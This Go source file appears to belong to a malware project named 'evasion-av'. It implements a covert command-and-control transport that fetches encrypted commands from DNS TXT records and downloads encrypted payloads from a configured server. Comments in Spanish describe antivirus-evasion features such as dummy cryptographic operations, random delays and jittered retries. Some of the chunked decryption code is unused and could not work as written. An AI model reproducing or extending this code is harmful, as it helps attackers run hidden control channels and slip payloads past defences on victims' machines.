package transport

import (
	"crypto/aes"
	"crypto/cipher"
	cryptorand "crypto/rand"
	"encoding/base64"
	"errors"
	"evasion-av/config"
	"fmt"
	"io"
	"math"
	mathrand "math/rand"
	"net"
	"net/http"
	"strings"
	"time"
)

const (
	maxRetries      = 3
	baseWaitTime    = 30 * time.Second
	maxJitter       = 60
	maxPayloadSize  = 255
	minKeySize      = 32 // AES-256
	chunkSize       = 64 // Tamaño de bloque para descifrado
	minDelay        = 50 // ms entre operaciones
	maxDelay        = 200
	dummyOperations = 3 // Operaciones falsas
)

var (
	ErrDecryptionFailed = errors.New("failed to decrypt payload")
	ErrInvalidPayload   = errors.New("invalid payload format")
)

type DNSClient struct {
	Domain          string
	Subdomain       string
	Key             []byte
	MaxRetries      int
	BaseWait        time.Duration
	MaxJitter       int
	chunkEnabled    bool
	scrambleEnabled bool
	dummyOpsEnabled bool
}

func init() {
	mathrand.Seed(time.Now().UnixNano())
}

// NewSecureDNSClient crea un cliente DNS con capacidades evasivas
func NewSecureDNSClient(domain, subdomain string, key []byte, evasiveMode bool) (*DNSClient, error) {
	if len(key) < minKeySize {
		return nil, fmt.Errorf("key must be at least %d bytes", minKeySize)
	}

	return &DNSClient{
		Domain:          strings.Trim(domain, "."),
		Subdomain:       strings.Trim(subdomain, "."),
		Key:             key,
		MaxRetries:      maxRetries,
		BaseWait:        baseWaitTime,
		MaxJitter:       maxJitter,
		chunkEnabled:    evasiveMode,
		scrambleEnabled: evasiveMode,
		dummyOpsEnabled: evasiveMode,
	}, nil
}

// FetchCommand obtiene y descifra comandos desde DNS TXT records
func (d *DNSClient) FetchCommand() ([]byte, error) {
	var lastErr error

	for attempt := 0; attempt < d.MaxRetries; attempt++ {
		txts, err := d.queryDNSWithRetry()
		if err != nil {
			lastErr = err
			d.waitWithJitter(attempt)
			continue
		}

		for _, txt := range txts {
			if len(txt) > maxPayloadSize {
				continue
			}

			decoded, err := base64.StdEncoding.DecodeString(txt)
			if err != nil {
				continue
			}

			plaintext, err := d.decrypt(decoded)
			if err == nil {
				return plaintext, nil
			}
			lastErr = err
		}

		lastErr = ErrInvalidPayload
		d.waitWithJitter(attempt)
	}

	return nil, fmt.Errorf("after %d attempts, last error: %v", d.MaxRetries, lastErr)
}

// queryDNSWithRetry realiza consultas DNS con reintento automático
func (d *DNSClient) queryDNSWithRetry() ([]string, error) {
	fqdn := fmt.Sprintf("%s.%s", d.Subdomain, d.Domain)

	txts, err := net.LookupTXT(fqdn)
	if err != nil && d.Subdomain != "" {
		txts, err = net.LookupTXT(d.Domain)
	}

	return txts, err
}

// waitWithJitter implementa backoff exponencial con jitter
func (d *DNSClient) waitWithJitter(attempt int) {
	waitTime := d.BaseWait * time.Duration(math.Pow(2, float64(attempt)))
	jitter := time.Duration(mathrand.Intn(d.MaxJitter)) * time.Second
	totalWait := waitTime + jitter

	time.Sleep(totalWait)
}

// decrypt maneja el descifrado con técnicas evasivas
func (d *DNSClient) decrypt(data []byte) ([]byte, error) {
	if d.dummyOpsEnabled {
		d.runDummyOperations(data)
	}

	block, err := aes.NewCipher(d.Key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	if len(data) < gcm.NonceSize() {
		return nil, ErrInvalidPayload
	}

	nonce := data[:gcm.NonceSize()]
	ciphertext := data[gcm.NonceSize():]

	return gcm.Open(nil, nonce, ciphertext, nil)

}

// decryptByChunks descifra en bloques pequeños con retardos
func (d *DNSClient) decryptByChunks(ciphertext, nonce []byte, gcm cipher.AEAD) ([]byte, error) {
	var plaintext []byte

	for i := 0; i < len(ciphertext); i += chunkSize {
		end := i + chunkSize
		if end > len(ciphertext) {
			end = len(ciphertext)
		}

		chunk := ciphertext[i:end]
		decrypted, err := gcm.Open(nil, nonce, chunk, nil)
		if err != nil {
			return nil, err
		}

		plaintext = append(plaintext, decrypted...)
		d.randomDelay()
	}

	return plaintext, nil
}

// decryptScrambled descifra bloques en orden aleatorio
func (d *DNSClient) decryptScrambled(ciphertext, nonce []byte, gcm cipher.AEAD) ([]byte, error) {
	blocks := make([][]byte, 0, (len(ciphertext)+chunkSize-1)/chunkSize)

	for i := 0; i < len(ciphertext); i += chunkSize {
		end := i + chunkSize
		if end > len(ciphertext) {
			end = len(ciphertext)
		}
		blocks = append(blocks, ciphertext[i:end])
	}

	// Mezclar bloques
	scrambled := make([][]byte, len(blocks))
	perm := mathrand.Perm(len(blocks))
	for i, v := range perm {
		scrambled[v] = blocks[i]
	}

	var plaintext []byte
	for _, block := range scrambled {
		decrypted, err := gcm.Open(nil, nonce, block, nil)
		if err != nil {
			return nil, err
		}
		plaintext = append(plaintext, decrypted...)
		d.randomDelay()
	}

	return plaintext, nil
}

// runDummyOperations ejecuta operaciones criptográficas falsas
func (d *DNSClient) runDummyOperations(data []byte) {
	for i := 0; i < dummyOperations; i++ {
		fakeKey := make([]byte, len(d.Key))
		copy(fakeKey, d.Key)
		fakeKey[i%len(fakeKey)] ^= byte(mathrand.Intn(256))

		block, _ := aes.NewCipher(fakeKey)
		gcm, _ := cipher.NewGCM(block)

		if len(data) > gcm.NonceSize() {
			gcm.Seal(nil, data[:gcm.NonceSize()], data[gcm.NonceSize():], nil)
		}
		d.randomDelay()
	}
}

// randomDelay introduce retardos aleatorios
func (d *DNSClient) randomDelay() {
	delay := time.Duration(minDelay+mathrand.Intn(maxDelay-minDelay)) * time.Millisecond
	time.Sleep(delay)
}

// Encrypt cifra datos para transmisión
func (d *DNSClient) Encrypt(data []byte) (string, error) {
	block, err := aes.NewCipher(d.Key)
	if err != nil {
		return "", err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err = cryptorand.Read(nonce); err != nil {
		return "", err
	}

	ciphertext := gcm.Seal(nonce, nonce, data, nil)
	return base64.StdEncoding.EncodeToString(ciphertext), nil
}
func (d *DNSClient) DownloadAndDecrypt() ([]byte, error) {
	resp, err := http.Get(config.ServerURL)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	cipherData, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	return d.decrypt(cipherData)
}
